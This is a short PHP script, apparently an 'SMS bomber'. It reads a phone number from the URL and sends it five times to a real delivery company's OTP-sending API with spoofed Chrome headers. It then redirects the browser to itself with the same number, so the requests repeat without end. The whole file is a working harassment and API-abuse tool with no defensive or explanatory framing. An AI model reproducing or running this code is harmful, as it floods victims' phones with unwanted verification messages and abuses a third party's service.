<?php
                
//__START__//     
echo "start server 1" ;
//__START__//

		set_time_limit(10000);
		if (isset($_GET['phone'])) {
			$phone = $_GET['phone'];
			for ($i = 0; $i < 5; $i++) {

     


//___________________________________API__________________________________________//





$curl = curl_init();

curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://cpanel.snapp-box.com/api/v2/auth/otp/send',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 0,
  CURLOPT_FOLLOWLOCATION => true,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS =>'{"phoneNumber":"0'.$phone.'"}',
  CURLOPT_HTTPHEADER => array(
    'sec-ch-ua: "Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
    'appVersion: 3.14.1',
    'Accept-Language: fa',
    'sec-ch-ua-mobile: ?0',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
    'Content-Type: application/json',
    'Accept: application/json, text/plain, */*',
    'Referer: https://cpanel.snapp-box.com/auth',
    'platform: web',
    'clientType: pwa',
    'sec-ch-ua-platform: "Windows"'
  ),
));

$response = curl_exec($curl);

curl_close($curl);
 







//___________________________________API__________________________________________//




//
//
//
//
//
//
//
//______________________________<<< GET-NEW-PAGE >>>______________________________//

}

$url = 'https://funnylearn.ir/tools/server1.php?phone='.$phone;
echo "<script>window.location.href='$url'</script>";

}
//______________________________<<< GET-NEW-PAGE >>>______________________________//



?>